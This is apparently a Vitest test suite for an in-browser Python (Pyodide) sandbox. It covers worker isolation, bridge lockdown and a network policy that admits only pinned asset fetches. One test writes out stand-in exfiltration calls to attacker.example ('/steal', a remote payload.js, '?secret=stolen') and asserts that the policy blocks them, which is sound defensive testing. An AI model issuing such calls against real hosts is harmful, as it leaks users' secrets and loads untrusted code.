// @vitest-environment jsdom

import fs from "node:fs";
import path from "node:path";
import { act, renderHook, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import {
    blockApplicationGlobals,
    BLOCKED_PYTHON_GLOBALS,
    createRestrictedPythonGlobals,
} from "@/lib/runtime/pyodideIsolation";
import {
    BLOCKED_EGRESS_GLOBALS,
    BLOCKED_NAVIGATOR_GLOBALS,
    installPyodideNetworkPolicy,
} from "@/lib/runtime/pyodideNetworkPolicy";
import type { PyodideWorkerRequest, PyodideWorkerResponse } from "@/lib/runtime/pyodideProtocol";
import { PYODIDE_BRIDGE_LOCKDOWN_BOOTSTRAP, PYODIDE_URL } from "@/lib/runtime/pyodideProtocol";
import { usePyodide } from "@/lib/runtime/usePyodide";

class MockWorker {
    static instances: MockWorker[] = [];
    static onPost: ((worker: MockWorker, request: PyodideWorkerRequest) => void) | null = null;

    onerror: ((event: ErrorEvent) => void) | null = null;
    onmessage: ((event: MessageEvent<PyodideWorkerResponse>) => void) | null = null;
    onmessageerror: (() => void) | null = null;
    messages: PyodideWorkerRequest[] = [];
    terminated = false;

    constructor(public url: URL) {
        MockWorker.instances.push(this);
    }

    postMessage(request: PyodideWorkerRequest) {
        this.messages.push(request);
        MockWorker.onPost?.(this, request);
    }

    respond(response: PyodideWorkerResponse) {
        this.onmessage?.({ data: response } as MessageEvent<PyodideWorkerResponse>);
    }

    terminate() {
        this.terminated = true;
    }
}

describe("isolated Pyodide worker", () => {
    beforeEach(() => {
        MockWorker.instances = [];
        MockWorker.onPost = (worker, request) => {
            queueMicrotask(() => {
                if (request.type === "load") worker.respond({ id: request.id, type: "loaded" });
                else {
                    worker.respond({
                        id: request.id,
                        type: "result",
                        result: { output: "hello\n\n42", error: null, duration: 4 },
                    });
                }
            });
        };
        vi.stubGlobal("Worker", MockWorker);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it("loads and executes only through a dedicated worker", async () => {
        const mainThreadLoader = vi.fn();
        Object.defineProperty(window, "loadPyodide", { configurable: true, value: mainThreadLoader });
        const { result, unmount } = renderHook(() => usePyodide());

        await act(async () => result.current.load());
        expect(result.current.status).toBe("ready");
        expect(MockWorker.instances).toHaveLength(1);
        expect(MockWorker.instances[0].url.pathname).toContain("pyodide.worker.ts");
        expect(MockWorker.instances[0].messages[0]).toMatchObject({ type: "load" });
        expect(mainThreadLoader).not.toHaveBeenCalled();

        let execution: Awaited<ReturnType<typeof result.current.run>> | undefined;
        await act(async () => {
            execution = await result.current.run("40 + 2");
        });

        expect(MockWorker.instances[0].messages[1]).toMatchObject({ type: "run", code: "40 + 2" });
        expect(execution).toEqual({ output: "hello\n\n42", error: null, duration: 4 });
        unmount();
        expect(MockWorker.instances[0].terminated).toBe(true);
    });

    it("terminates a running program and rejects its pending worker request", async () => {
        MockWorker.onPost = (worker, request) => {
            if (request.type === "load") queueMicrotask(() => worker.respond({ id: request.id, type: "loaded" }));
        };
        const { result } = renderHook(() => usePyodide());
        await act(async () => result.current.load());

        let execution!: Promise<Awaited<ReturnType<typeof result.current.run>>>;
        act(() => {
            execution = result.current.run("while True: pass");
        });
        await waitFor(() => expect(result.current.status).toBe("running"));
        act(() => result.current.terminate());

        await expect(execution).resolves.toMatchObject({ output: "", error: "Python execution stopped" });
        expect(MockWorker.instances[0].terminated).toBe(true);
        expect(result.current.status).toBe("unloaded");
    });

    it("rejects overlapping executions before they can share worker output state", async () => {
        let finishFirst!: () => void;
        MockWorker.onPost = (worker, request) => {
            if (request.type === "load") {
                queueMicrotask(() => worker.respond({ id: request.id, type: "loaded" }));
                return;
            }
            if (!finishFirst) {
                finishFirst = () =>
                    worker.respond({
                        id: request.id,
                        type: "result",
                        result: { output: "first", error: null, duration: 3 },
                    });
            }
        };
        const { result } = renderHook(() => usePyodide());
        await act(async () => result.current.load());

        let first!: Promise<Awaited<ReturnType<typeof result.current.run>>>;
        act(() => {
            first = result.current.run("print('first')");
        });
        await waitFor(() => expect(result.current.status).toBe("running"));
        const second = result.current.run("print('second')");

        await expect(second).resolves.toMatchObject({ error: expect.stringContaining("already running") });
        expect(MockWorker.instances[0].messages.filter(message => message.type === "run")).toHaveLength(1);
        finishFirst();
        await expect(first).resolves.toMatchObject({ output: "first", error: null });
    });

    it("disposes a failed worker and can retry with a fresh one", async () => {
        vi.spyOn(console, "error").mockImplementation(() => undefined);
        let attempt = 0;
        MockWorker.onPost = (worker, request) => {
            if (request.type !== "load") return;
            attempt += 1;
            queueMicrotask(() => {
                if (attempt === 1) worker.respond({ id: request.id, type: "error", error: "bootstrap failed" });
                else worker.respond({ id: request.id, type: "loaded" });
            });
        };
        const { result } = renderHook(() => usePyodide());

        await act(async () => result.current.load());
        expect(result.current.status).toBe("error");
        expect(result.current.loadError).toBe("bootstrap failed");
        expect(MockWorker.instances[0].terminated).toBe(true);

        await act(async () => result.current.load());
        expect(result.current.status).toBe("ready");
        expect(MockWorker.instances).toHaveLength(2);
    });

    it("registers a null-prototype js module and shadows app storage globals", () => {
        const globals = createRestrictedPythonGlobals();
        expect(Object.getPrototypeOf(globals)).toBeNull();
        expect(Reflect.ownKeys(globals)).toEqual([]);

        const workerPrototype: Record<string, unknown> = {
            indexedDB: { open: vi.fn() },
            sessionStorage: { token: "secret" },
        };
        const workerScope = Object.create(workerPrototype) as Record<string, unknown>;
        blockApplicationGlobals(workerScope);
        for (const name of BLOCKED_PYTHON_GLOBALS) expect(workerScope[name]).toBeUndefined();
        expect(workerPrototype.indexedDB).toBeUndefined();
        expect(workerPrototype.sessionStorage).toBeUndefined();

        const source = fs.readFileSync(path.resolve(process.cwd(), "lib/runtime/pyodide.worker.ts"), "utf8");
        expect(source).toContain("jsglobals: createRestrictedPythonGlobals()");
        expect(source.indexOf("blockApplicationGlobals(globalThis)")).toBeLessThan(source.indexOf("loadPyodide({"));
    });

    it("removes Pyodide JS bridges without breaking runtime constructors", () => {
        expect(PYODIDE_BRIDGE_LOCKDOWN_BOOTSTRAP).toContain('_n0x_sys.modules.pop("js", None)');
        expect(PYODIDE_BRIDGE_LOCKDOWN_BOOTSTRAP).toContain('_n0x_sys.modules.pop("pyodide_js", None)');
        expect(PYODIDE_BRIDGE_LOCKDOWN_BOOTSTRAP).toContain("_n0x_pyodide_code.run_js = _n0x_blocked_run_js");

        const source = fs.readFileSync(path.resolve(process.cwd(), "lib/runtime/pyodide.worker.ts"), "utf8");
        expect(source).toContain('loaded.unregisterJsModule("js")');
        expect(source).toContain('loaded.unregisterJsModule("pyodide_js")');
        expect(source.indexOf('loaded.unregisterJsModule("pyodide_js")')).toBeLessThan(
            source.indexOf("runtime = loaded")
        );
        expect(source).not.toContain("blockDynamicCodeGlobals");
        const runtimeScope = { Function: vi.fn(), eval: vi.fn() };
        blockApplicationGlobals(runtimeScope);
        expect(runtimeScope.Function).toBeTypeOf("function");
        expect(runtimeScope.eval).toBeTypeOf("function");

        const nextConfig = fs.readFileSync(path.resolve(process.cwd(), "next.config.mjs"), "utf8");
        const vercelConfig = fs.readFileSync(path.resolve(process.cwd(), "vercel.json"), "utf8");
        for (const config of [nextConfig, vercelConfig]) {
            expect(config).toContain("https://cdn.jsdelivr.net/pyodide/v0.26.4/full/");
            expect(config).not.toMatch(/https:\/\/cdn\.jsdelivr\.net(?:[\s;"'])/);
            expect(config).toContain("worker-src 'self' blob:");
        }
    });

    it("allows only pinned Pyodide GET assets without credentials or referrer", async () => {
        const nativeFetch = vi.fn(async () => new Response("asset"));
        const nativeImportScripts = vi.fn();
        const scope = {
            fetch: nativeFetch as typeof fetch,
            importScripts: nativeImportScripts,
            navigator: { language: "en", sendBeacon: vi.fn(), storage: { getDirectory: vi.fn() }, userAgent: "test" },
        };
        installPyodideNetworkPolicy(scope);

        await expect(
            scope.fetch(`${PYODIDE_URL}pyodide.asm.wasm`, {
                credentials: "include",
                method: "GET",
                referrerPolicy: "unsafe-url",
            })
        ).resolves.toBeInstanceOf(Response);
        expect(nativeFetch).toHaveBeenCalledWith(
            `${PYODIDE_URL}pyodide.asm.wasm`,
            expect.objectContaining({
                body: undefined,
                credentials: "omit",
                headers: undefined,
                keepalive: false,
                method: "GET",
                mode: "cors",
                redirect: "error",
                referrerPolicy: "no-referrer",
            })
        );

        scope.importScripts(`${PYODIDE_URL}pyodide.js`);
        expect(nativeImportScripts).toHaveBeenCalledExactlyOnceWith(`${PYODIDE_URL}pyodide.js`);
        expect(scope.navigator).toMatchObject({ language: "en", userAgent: "test" });
        expect(scope.navigator.storage).toBeUndefined();
    });

    it("blocks attacker fetch, script import, sockets, and alternate worker transports", async () => {
        const nativeFetch = vi.fn(async () => new Response("asset"));
        const nativeImportScripts = vi.fn();
        const networkPrototype: Record<string, any> = {
            WebSocket: vi.fn(),
            fetch: nativeFetch,
            importScripts: nativeImportScripts,
            navigator: Object.fromEntries(
                BLOCKED_NAVIGATOR_GLOBALS.map(name => [name, name === "storage" ? { getDirectory: vi.fn() } : vi.fn()])
            ),
        };
        const scope = Object.assign(Object.create(networkPrototype), {
            cookieStore: { getAll: vi.fn() },
        }) as Record<string, any>;
        blockApplicationGlobals(scope);
        installPyodideNetworkPolicy(scope);

        await expect(scope.fetch("https://attacker.example/steal")).rejects.toThrow("pinned Pyodide GET assets");
        await expect(scope.fetch(`${PYODIDE_URL}pyodide.js`, { method: "POST" })).rejects.toThrow(
            "pinned Pyodide GET assets"
        );
        await expect(scope.fetch("data:text/plain,stolen")).rejects.toThrow("pinned Pyodide GET assets");
        await expect(scope.fetch(`${PYODIDE_URL}pyodide.js?secret=stolen`)).rejects.toThrow(
            "pinned Pyodide GET assets"
        );
        expect(() => scope.importScripts("https://attacker.example/payload.js")).toThrow("pinned Pyodide assets");
        expect(nativeFetch).not.toHaveBeenCalled();
        expect(nativeImportScripts).not.toHaveBeenCalled();
        await expect(networkPrototype.fetch("https://attacker.example/prototype-bypass")).rejects.toThrow(
            "pinned Pyodide GET assets"
        );
        expect(() => networkPrototype.importScripts("https://attacker.example/prototype-bypass.js")).toThrow(
            "pinned Pyodide assets"
        );

        for (const name of BLOCKED_EGRESS_GLOBALS) expect(scope[name]).toBeUndefined();
        expect(networkPrototype.WebSocket).toBeUndefined();
        for (const name of BLOCKED_NAVIGATOR_GLOBALS) expect(scope.navigator[name]).toBeUndefined();
        expect(networkPrototype.navigator.storage).toBeUndefined();
        expect(scope.cookieStore).toBeUndefined();
    });
});
